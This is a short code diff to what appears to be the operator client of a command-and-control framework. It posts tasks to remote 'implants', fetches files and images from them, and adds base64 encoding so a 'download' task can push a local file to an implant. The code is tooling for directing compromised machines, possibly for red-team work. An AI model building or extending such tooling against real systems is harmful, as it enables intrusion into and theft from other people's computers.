@@ -3,6 +3,7 @@ import requests
 import os
 import tabulate
 import json
+import base64
 
 def display_results(results):
     if not results:
@@ -101,15 +102,26 @@ def get_file(server_url, access_token, task_id):
         print(f"[!] Failed to retrieve image: {e}")
         return None
 
-def post_task(server_url, implant_id, task_type,cmd, access_token):
+def post_task(server_url, implant_id, task_type, cmd,access_token):
     try:
         headers = {'Authorization': f'Bearer {access_token}'}
-        response = requests.post(f'{server_url}/tasks', headers=headers, json=[{"implant_id": implant_id, "task_type": task_type, "cmd": cmd}])
+        data = file_to_base64(cmd) if task_type == 'download' else None
+        response = requests.post(f'{server_url}/tasks', headers=headers, json=[{"implant_id": implant_id, "task_type": task_type, "cmd": cmd, "data": data}])
         response.raise_for_status()
         print("[+] Task posted successfully.")
         return response.json()
     except requests.exceptions.RequestException as e:
         print(f"[!] Failed to post task: {e}")
+        return None
+    
+def file_to_base64(file_path):
+    try:
+        with open(file_path, 'rb') as file:
+            file_bytes = file.read()
+            base64_encoded = base64.b64encode(file_bytes).decode('utf-8')
+            return base64_encoded
+    except IOError as e:
+        print(f"Error reading file {file_path}: {e}")
         return None
 
 def main():
